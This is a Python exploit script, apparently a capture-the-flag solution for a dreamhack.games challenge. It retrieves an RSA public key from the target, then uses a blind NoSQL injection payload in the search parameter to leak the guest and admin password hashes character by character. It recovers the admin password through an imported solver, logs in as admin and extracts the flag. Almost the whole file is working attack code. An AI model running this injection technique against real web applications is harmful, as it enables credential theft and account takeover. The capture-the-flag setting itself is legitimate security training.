import requests
import string
import re
from decrypt import *

url = "http://host8.dreamhack.games:14583"
s = requests.Session()

# get rsa stuff
res = s.get(f'{url}/getkey')

N = int(re.findall(r'N:(.+)</p>', res.text)[0].strip())
e = int(re.findall(r'e:(.+)</p>', res.text)[0].strip())

# get hash using nosqli
charset = string.digits + string.ascii_lowercase

def leak(user):
    hash = ""
    
    while len(hash) < 128:
        for char in charset:
            print("Trying:", char, '|', hash)

            idx = len(hash)

            res = s.get(f'{url}/search', params={
                'q': f"{user}') && this.password.slice({idx}, {idx + 1})=='{char}';return ('"
            })

            if res.text.count(user) > 1:
                hash += char
                break
    return hash

guest = leak("guest")
admin = leak("admin")

# decrypt password
print("N:", N)
print("e:", e)
print("Guest:", guest)
print("Admin:", admin)

password = solve(N, e, admin, guest)
print("Password:", password)

# get flag
res = s.post(f'{url}/login', data={
    'username': 'admin',
    'password': password
})

flag = re.findall(r'(WaRP{.+})', res.text)[0]
print("Flag:", flag)